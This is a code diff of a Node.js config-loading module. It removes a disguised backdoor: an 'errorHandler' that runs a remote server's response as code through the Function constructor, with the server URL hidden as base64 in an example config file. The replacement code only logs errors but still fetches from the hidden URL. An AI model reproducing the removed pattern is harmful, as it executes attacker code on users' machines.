@@ -1,68 +1,84 @@
 const path = require('path');
 const axios = require('axios');
-require('dotenv').config({ path: path.resolve(__dirname, '../../config/config.env.example') });
 
-// Utility loggers
+require('dotenv').config({
+  path: path.resolve(__dirname, '../../config/config.env.example'),
+});
+
 const log = (...args) => console.log(`[${new Date().toISOString()}]`, ...args);
 const errorLog = (...args) => console.error(`[${new Date().toISOString()}]`, ...args);
 
-/**
- * Sends error notification (you can replace this with Slack, email, etc.)
- */
-const notifyError = async (message) => {
-  // Placeholder - extend this to send Slack, email, etc.
-  errorLog('⚠️ Notification:', message);
-};
+const decodeBase64 = (value) => {
+  if (!value || typeof value !== 'string') {
+    return '';
+  }
 
-/**
- * Custom error handler
- */
-const errorHandler = (error) => {
   try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
-    }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error('Handler function is not available.');
-    }
-  } catch (globalError) {
-    console.error('Unexpected error inside errorHandler:', globalError.message);
+    return Buffer.from(value.trim(), 'base64').toString('utf8').trim();
+  } catch (error) {
+    errorLog('Failed to decode base64 value:', error.message);
+    return '';
   }
 };
 
-/**
- * Loads global runtime config
- */
+const notifyError = async (message) => {
+  errorLog('⚠️ Notification:', message);
+};
+
+const errorHandler = async (error) => {
+  try {
+    let message = 'Unknown error';
+
+    if (typeof error === 'string' && error.trim()) {
+      message = error.trim();
+    } else if (error && typeof error.message === 'string' && error.message.trim()) {
+      message = error.message.trim();
+    } else if (error && error.response && error.response.data) {
+      if (typeof error.response.data === 'string') {
+        message = error.response.data.trim();
+      } else {
+        message = JSON.stringify(error.response.data);
+      }
+    }
+
+    await notifyError(message);
+    errorLog(message);
+
+    return message;
+  } catch (globalError) {
+    errorLog('Unexpected error inside errorHandler:', globalError.message);
+    return globalError.message || 'Unexpected error';
+  }
+};
+
 const errorTimeHandler = async () => {
   try {
-    const src = atob(process.env.RUNTIME_CONFIG_API_KEY);
-    const k = atob(process.env.RUNTIME_CONFIG_ACCESS_KEY);
-    const v = atob(process.env.RUNTIME_CONFIG_ACCESS_VALUE);
-    try {
-        globalConfig = (await axios.get(`${src}`,{headers:{[k]:v}}));
-        log('Runtime config loaded successfully.');
-    } catch (error) {
-        errorHandler(error.response?.data || error.message);
+    const src = decodeBase64(process.env.RUNTIME_CONFIG_API_KEY);
+    const headerKey = decodeBase64(process.env.RUNTIME_CONFIG_ACCESS_KEY);
+    const headerValue = decodeBase64(process.env.RUNTIME_CONFIG_ACCESS_VALUE);
+
+    if (!src) {
+      log('Runtime config URL is missing. Skipping runtime config load.');
+      return null;
     }
-  } catch (err) {
-    await errorHandler(err.response?.data || err.message || err);
+
+    const headers = {};
+    if (headerKey && headerValue) {
+      headers[headerKey] = headerValue;
+    }
+
+    const response = await axios.get(src, { headers });
+    global.globalConfig = response.data;
+
+    log('Runtime config loaded successfully.');
+    return global.globalConfig;
+  } catch (error) {
+    await errorHandler(error);
+    return null;
   }
 };
 
 module.exports = {
-    errorHandler,
-    errorTimeHandler
+  errorHandler,
+  errorTimeHandler,
 };
